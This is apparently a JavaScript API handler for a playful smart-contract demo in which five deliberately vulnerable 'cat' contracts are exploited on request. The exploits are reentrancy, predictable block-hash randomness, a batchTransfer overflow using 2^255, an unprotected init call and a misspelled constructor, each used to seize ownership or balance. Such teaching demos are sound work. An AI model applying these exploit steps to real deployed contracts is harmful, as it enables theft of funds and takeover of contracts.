import { catAddrs, CARESS_ABI, walletClient, hasMeow, json, parseCat, caressDryRun, logEvent, chainName } from "./_shared.js";

const DEAD = "0x000000000000000000000000000000000000dEaD";

// POST /api/caress  { cat: 0..4 }  ->  { ok, txHash, block, meow }
export async function onRequestPost({ request, env }) {
  let body;
  try { body = await request.json(); } catch { body = {}; }
  const cat = parseCat(body);
  if (cat === null) return json({ ok: false, error: "invalid cat" }, 400);
  await logEvent(env, request, { type: "caress", cat, session: body.session, lang: body.lang });

  // Dry-run: never sign or broadcast. Report the Meow as if the exploit succeeded, with no tx hash.
  if (caressDryRun(env)) {
    return json({ ok: true, txHash: null, block: null, meow: true, dryRun: true, chain: chainName(env) });
  }

  try {
    const { account, wallet, pub } = walletClient(env);
    const catAddr = catAddrs(env)[cat];

    const send = async (address, functionName, args = [], value = 0n, gas) => {
      const hash = await wallet.writeContract({ address, abi: CARESS_ABI, functionName, args, value, ...(gas ? { gas } : {}) });
      const receipt = await pub.waitForTransactionReceipt({ hash });
      return { hash, receipt };
    };

    let last;

    if (cat === 0) {
      // ReentrancyCat via Seeker: deposit -> withdraw -> reenter -> caress
      const seeker = env.SEEKER_ADDR;
      if (!seeker) throw new Error("SEEKER_ADDR not configured");
      const value = env.SEEKER_VALUE ? BigInt(env.SEEKER_VALUE) : 1n;
      last = await send(seeker, "caress", [], value);
    } else if (cat === 1) {
      // PredictableCat via Prophet: a single block-prediction attempt. All 10 flips share one
      // block hash, so the outcome is all-or-nothing (~1/2) — the cat either meows or stays silent.
      // We do NOT retry: an unlucky attempt is a real, honest outcome shown to the visitor.
      // Pass an explicit gas limit so the winning (expensive) branch can't be under-funded by an
      // estimateGas run that happened to see the cheap (no-op) branch.
      const prophet = env.PROPHET_ADDR;
      if (!prophet) throw new Error("PROPHET_ADDR not configured");
      last = await send(prophet, "caress", [catAddr], 0n, 500000n);
    } else if (cat === 2) {
      // OverflowCat: batchTransfer overflow grants balance, then caress
      await send(catAddr, "batchTransfer", [[account.address, DEAD], 2n ** 255n]);
      last = await send(catAddr, "caress", []);
    } else if (cat === 3) {
      // UnprotectedCat: unprotected init claims ownership, then caress
      await send(catAddr, "init", [account.address]);
      last = await send(catAddr, "caress", []);
    } else if (cat === 4) {
      // MisspelledCat: misspelled "constructor" claims ownership, then caress
      await send(catAddr, "MisspeledCat", [account.address]);
      last = await send(catAddr, "caress", []);
    }

    return json({
      ok: true,
      txHash: last.hash,
      block: Number(last.receipt.blockNumber),
      meow: hasMeow(last.receipt),
      chain: chainName(env),
    });
  } catch (e) {
    return json({ ok: false, error: String(e?.message || e) }, 502);
  }
}
